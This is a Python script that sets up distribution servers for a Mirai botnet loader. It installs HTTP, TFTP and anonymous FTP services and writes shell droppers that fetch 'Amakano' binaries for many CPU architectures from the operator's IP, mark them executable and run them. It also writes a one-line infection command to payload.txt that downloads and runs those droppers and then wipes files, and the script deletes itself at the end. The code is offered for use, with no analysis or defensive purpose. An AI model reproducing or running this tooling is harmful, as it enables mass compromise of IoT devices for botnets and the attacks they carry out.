import subprocess, sys, urllib, time
ip = urllib.urlopen('http://api.ipify.org').read()
exec_bin = "yk"
exec_name = "ssh"
bin_prefix = ""
bin_directory = "vb"
archs = ["Amakano.x86",               #1
"Amakano.mips",                       #2
"Amakano.mpsl",                       #3
"Amakano.arm",                       #4
"Amakano.arm5",                       #5
"Amakano.arm6",                       #6
"Amakano.arm7",                       #7
"Amakano.ppc",                        #8
"Amakano.m68k",                       #9
"Amakano.sh4",
"x86"]                        #11
def run(cmd):
    subprocess.call(cmd, shell=True)
print("\x1b[0;37m[CC] INSTALLING WEB SERVER DEPENDENCIES")
run("yum install httpd -y &> /dev/null")
run("service httpd start &> /dev/null")
run("yum install xinetd tftp tftp-server -y &> /dev/null")
run("yum install vsftpd -y &> /dev/null")
run("service vsftpd start &> /dev/null")
run('''echo "service tftp
{
	socket_type             = dgram
	protocol                = udp
	wait                    = yes
    user                    = root
    server                  = /usr/sbin/in.tftpd
    server_args             = -s -c /var/lib/tftpboot
    disable                 = no
    per_source              = 11
    cps                     = 100 2
    flags                   = IPv4
}
" > /etc/xinetd.d/tftp''')	
run("service xinetd start &> /dev/null")
run('''echo "listen=YES
local_enable=NO
anonymous_enable=YES
write_enable=NO
anon_root=/var/ftp
anon_max_rate=2048000
xferlog_enable=YES
listen_address='''+ ip +'''
listen_port=21" > /etc/vsftpd/vsftpd-anon.conf''')
run("service vsftpd restart &> /dev/null")
run("service xinetd restart &> /dev/null")
print("\x1b[0;37m[CC] CREATING .SH BINS")
time.sleep(3)
run('echo "#!/bin/bash" > /var/lib/tftpboot/tz.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/tz.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/tz.sh')
run('echo "#!/bin/bash" > /var/lib/tftpboot/tz2.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/tz2.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/tz2.sh')
run('echo "#!/bin/bash" > /var/www/html/z.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/tz2.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/tz2.sh')
run('echo "#!/bin/bash" > /var/ftp/z1.sh')
run('echo "ulimit -n 1024" >> /var/ftp/z1.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/ftp/z1.sh')
for i in archs:
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+exec_name+'" >> /var/www/html/z.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' '+bin_prefix+i+' '+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+exec_name+'" >> /var/ftp/z1.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get '+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+exec_name+'" >> /var/lib/tftpboot/tz.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r '+bin_prefix+i+' -g ' + ip + ';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+exec_name+'" >> /var/lib/tftpboot/tz2.sh')    
run("service xinetd restart &> /dev/null")
run("service httpd restart &> /dev/null")
run('echo -e "ulimit -n 99999" >> ~/.bashrc')
print("\x1b[0;37m[CC] BUILDING MIRAI PAYLOAD PAYLOAD")
time.sleep(3)
print("\x1b[0;37m[CC] FINISHED SETTING UP MIRAI PAYLOAD")
complete_payload = ("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/z.sh; curl -O http://" + ip + "/z.sh; chmod 777 z.sh; sh z.sh; tftp " + ip + " -c get tz.sh; chmod 777 tz.sh; sh tz.sh; tftp -r tz2.sh -g " + ip + "; chmod 777 tz2.sh; sh tz2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " z1.sh z1.sh; sh z1.sh; rm -rf z.sh tz.sh tz2.sh z1.sh; rm -rf *")
f = open("payload.txt","w+")
f.write(complete_payload)
f.close()
print("\x1b[0;37moutput to payload.txt")
time.sleep(3)
run("ulimit -u99999; ulimit -n99999")
run("clear")
run("rm -rf ~/payload.py")
exit()
